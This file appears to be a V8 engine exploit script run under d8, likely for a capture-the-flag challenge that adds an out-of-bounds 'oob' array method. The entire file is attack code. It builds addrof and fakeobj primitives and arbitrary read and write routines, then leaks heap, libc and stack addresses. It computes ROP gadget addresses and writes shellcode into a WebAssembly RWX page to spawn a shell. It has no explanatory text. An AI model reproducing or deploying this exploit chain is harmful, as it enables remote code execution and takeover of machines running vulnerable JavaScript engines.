#!./d8 --allow-natives-syntax
/// Helper functions to convert between float and integer primitives
c = ["aaa","bbb","ccc"]
flt = [1.1,1.2,1.3]
a = [1,2,3]
fake = {a:"343434"}
obj_arr = [fake]
fake2 = [fake]
origin = fake2.oob()
float_arr = [1.1,2.2,3.3]

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
flt_map = ftoi(flt.oob())
packed_map = ftoi(c.oob())
small_map = ftoi(a.oob())
obj_arr_map = ftoi(obj_arr.oob())
heapleak = packed_map-BigInt(1985)
heapleak2 = heapleak-BigInt(48)
function addrof(val){
  fake2[0] = val
  fake2.oob(itof(flt_map))
  result = fake2[0]
  fake2.oob(origin)
  return ftoi(result)
}

arb_rw_arr = [itof(flt_map),itof(0x0000000200000000n),1.2,itof((0x1n<<32n))] // only leak 1 addr
console.log("debug arb_rw_arr: ");%DebugPrint(arb_rw_arr)
function fakeobj(val){
  if(val % 2n==0){
    val +=1n
  }
  first = addrof(arb_rw_arr) - 0x20n
  arb_rw_arr[2] = itof(val-0x10n)
  flt[0] = itof(first)
  flt.oob(itof(obj_arr_map))
  result = flt[0]
  flt.oob(itof(flt_map))
  return result
}
function ptrva(val){
  flt_arr = [1.1,2.2,3.3]
  flt_arr[0] = fakeobj(val)
  flt_arr.oob(origin)
  result = flt_arr[0][0]
  flt_arr.oob(itof(flt_map))
  return ftoi(result)
}
function wrivar(addr,val){
  flt_arr = [1.1,2.2,3.3]
  flt_arr[0] = fakeobj(addr-0x8n)
  flt_arr.oob(origin)
  flt_arr[0].oob(itof(val))
  flt_arr.oob(itof(flt_map))
}
function align(val){
  return val & 0xfffffffffffffffn

}


console.log("leak heap: " + "0x"+heapleak.toString(16));
console.log("leak packed: " + "0x"+packed_map.toString(16));
console.log("leak ft: "+"0x"+flt_map.toString(16));
console.log("\033[33mdebug flt:\033[0m");%DebugPrint(flt)
heapaddr = ptrva(heapleak)
console.log("heapaddr: 0x"+ heapaddr.toString(16))
binary = ptrva(heapaddr)
console.log("binary: 0x"+ binary.toString(16))
leaklibcaddr = binary+0x2dde0n
leaklibc = ptrva(align(leaklibcaddr))
base_libc = leaklibc -0xa4e50n
console.log("leak libc: 0x"+ leaklibc.toString(16))
environaddr = leaklibc + 0x149f28n
leakstack = ptrva(align(environaddr))
console.log("leakstack: 0x"+ leakstack.toString(16))
console.log("base_libc: 0x"+ base_libc.toString(16))
write_addr = leakstack -131992n
system_libc = base_libc + 0x51c30n
bin_sh = base_libc + 0x1afe43n
pop_rdi = base_libc + 0x000000000002493dn
// wrivar(align(write_addr),pop_rdi)
// wrivar(align(write_addr+0x8n),bin_sh)
// wrivar(align(write_addr+0x10n),system_libc)
// wrivar(align(0x10n),system_libc,flt)
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
function shell_copy(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);

    console.log("\033[31mbuff: 0x\033[0m"+ buf_addr.toString(16))
    console.log("\033[31mdebug dataview: 0x\033[0m"+ addrof(dataview).toString(16))
    let backing_store_addr = buf_addr + 0x20n;
    wrivar(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}
var shellcode=[1002489672, 1207959552, 826865201, 801065170, 795765090, 1442867315, 3884533847, 1295]
leakwasm = heapaddr+ 0x1fe08n;
rwx_addr = ptrva(leakwasm)+0x300n;
// wasm_addr = addrof(wasm_mod)
console.log("rwx_addr: 0x"+rwx_addr.toString(16));
// console.log("debug wasm_instance : 0x"+wasm_addr.toString(16))
shell_copy(rwx_addr,shellcode);

write_next = leakstack -3208n;
console.log("write_next: 0x"+write_next.toString(16));


